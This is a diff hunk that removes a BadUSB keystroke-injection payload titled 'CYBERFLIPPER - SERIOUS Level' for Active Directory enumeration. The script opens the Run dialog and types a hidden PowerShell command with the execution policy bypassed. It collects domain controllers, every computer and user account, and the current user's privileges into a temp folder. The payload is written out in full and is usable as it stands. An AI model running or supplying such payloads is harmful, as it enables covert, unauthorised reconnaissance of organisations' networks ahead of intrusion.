@@ -1,7 +1,0 @@
-REM CYBERFLIPPER - SERIOUS Level
-REM Active Directory Enumeration - Domain recon
-DELAY 500
-GUI r
-DELAY 300
-STRING powershell -W Hidden -EP Bypass -C "$d=\"$env:TEMP\ad_enum\";md $d -F;try{nltest /dclist:>\"$d\dcs.txt\";$s=New-Object DirectoryServices.DirectorySearcher;$s.Filter='(objectClass=computer)';$s.FindAll()|%{$_.Properties['cn']}|Out-File \"$d\computers.txt\";$s.Filter='(objectClass=user)';$s.FindAll()|%{$_.Properties['samaccountname']}|Out-File \"$d\users.txt\";whoami /all>\"$d\privs.txt\"}catch{$_|Out-File \"$d\err.txt\"};explorer $d"
-ENTER
